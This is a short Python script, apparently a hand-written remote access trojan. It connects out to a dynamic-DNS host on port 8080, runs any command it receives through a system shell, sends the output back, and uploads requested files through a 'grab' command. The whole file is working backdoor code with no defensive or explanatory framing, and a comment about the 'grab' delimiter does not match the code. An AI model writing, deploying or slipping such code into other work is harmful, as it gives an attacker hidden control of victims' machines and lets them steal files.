import socket
import subprocess
import os

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, "rb")
        # Reading the file in kb chunks.
        packet = f.read(1024)
        while len(packet) > 0:
            # Sends 1kb to server, then continues to send after.
            s.send(packet)
            packet = f.read(1024)
        s.send("DONE".encode())
        
    # File does not exist
    else:
        s.send("File not found".encode())

def connect(ip):
    s = socket.socket()
    s.connect((ip, 8080))
    while True:
        # Gets input from server-side (1kb max)
        command = s.recv(1024)  
        if "q" in command.decode():
            s.close()
            break
        # Splits grab, path into two sections, seperated by an asterisk. Path is the filepath for the file we are downloading.
        elif "grab" in command.decode():
            grab, path = command.decode().split("•")
            try:
                transfer(s, path)
            except:
                pass
        else:
            cmd_exe = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(cmd_exe.stdout.read())
            s.send(cmd_exe.stderr.read())
            
def main():
    ip = socket.gethostbyname("jakeoliverlee.ddns.net")
    
    connect(ip)
    
main()